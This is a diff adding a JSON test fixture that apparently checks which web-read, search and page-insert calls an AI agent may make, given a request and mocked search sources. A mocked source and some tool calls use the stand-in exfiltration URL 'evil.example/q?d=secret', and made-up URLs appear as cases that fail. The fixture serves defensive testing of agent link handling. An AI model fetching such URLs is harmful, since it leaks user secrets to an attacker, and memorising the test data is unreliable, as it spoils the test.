@@ -1,0 +1,135 @@
+{
+  "request": "Find videos like https://given.example/r",
+  "search": {
+    "answer": "See https://made.up/x",
+    "sources": [
+      {
+        "url": "https://found.example/a",
+        "title": "A"
+      },
+      {
+        "url": "https://evil.example/q?d=secret"
+      }
+    ]
+  },
+  "sequences": [
+    {
+      "armed": false,
+      "calls": [
+        {
+          "tool": "insert_blocks",
+          "args": "{\"position\":\"end\",\"blocks\":[{\"type\":\"link_preview\",\"link\":{\"url\":\"https://made.up/before\"}}]}",
+          "ok": true
+        },
+        {
+          "tool": "read_web_page",
+          "args": "{\"url\":\"https://any.example/\"}",
+          "ok": true
+        },
+        {
+          "tool": "read_web_page",
+          "args": "{\"url\":\"https://other.example/\"}",
+          "ok": false
+        },
+        {
+          "tool": "read_web_page",
+          "args": "{\"url\":\"https://found.example/b#part\"}",
+          "ok": true
+        },
+        {
+          "tool": "insert_blocks",
+          "args": "{\"position\":\"end\",\"blocks\":[{\"type\":\"link_preview\",\"link\":{\"url\":\"https://found.example/b\"}}]}",
+          "ok": true
+        },
+        {
+          "tool": "insert_blocks",
+          "args": "{\"position\":\"end\",\"blocks\":[{\"type\":\"link_preview\",\"link\":{\"url\":\"https://made.up/x\"}}]}",
+          "ok": false
+        },
+        {
+          "tool": "insert_blocks",
+          "args": "{\"position\":\"end\",\"blocks\":[{\"type\":\"link_preview\",\"link\":{\"url\":\"https://given.example/r\"}}]}",
+          "ok": true
+        },
+        {
+          "tool": "write_markdown",
+          "args": "{\"position\":\"end\",\"markdown\":\"[more](https://made.up/y)\"}",
+          "ok": false
+        }
+      ],
+      "kept_to_page": true
+    },
+    {
+      "armed": false,
+      "calls": [
+        {
+          "tool": "web_search",
+          "args": "{\"query\":\"evil.example/q?d=secret\"}",
+          "ok": true
+        },
+        {
+          "tool": "read_web_page",
+          "args": "{\"url\":\"https://evil.example/q?d=secret\"}",
+          "ok": false
+        },
+        {
+          "tool": "read_web_page",
+          "args": "{\"url\":\"https://made.up/x\"}",
+          "ok": false
+        },
+        {
+          "tool": "read_web_page",
+          "args": "{\"url\":\"https://found.example/a\"}",
+          "ok": true
+        },
+        {
+          "tool": "web_search",
+          "args": "{\"query\":\"see www.example.com\"}",
+          "ok": false
+        },
+        {
+          "tool": "web_search",
+          "args": "{\"query\":\"AI videos this week\"}",
+          "ok": true
+        },
+        {
+          "tool": "list_pages",
+          "args": "{}",
+          "ok": true
+        },
+        {
+          "tool": "web_search",
+          "args": "{\"query\":\"AI videos\"}",
+          "ok": false
+        },
+        {
+          "tool": "read_web_page",
+          "args": "{\"url\":\"https://found.example/a\"}",
+          "ok": false
+        },
+        {
+          "tool": "insert_blocks",
+          "args": "{\"position\":\"end\",\"blocks\":[{\"type\":\"link_preview\",\"link\":{\"url\":\"https://found.example/a\"}}]}",
+          "ok": false
+        }
+      ],
+      "kept_to_page": false
+    },
+    {
+      "armed": true,
+      "calls": [
+        {
+          "tool": "read_web_page",
+          "args": "{\"url\":\"https://given.example/r\"}",
+          "ok": false
+        },
+        {
+          "tool": "web_search",
+          "args": "{\"query\":\"q\"}",
+          "ok": false
+        }
+      ],
+      "kept_to_page": true
+    }
+  ]
+}
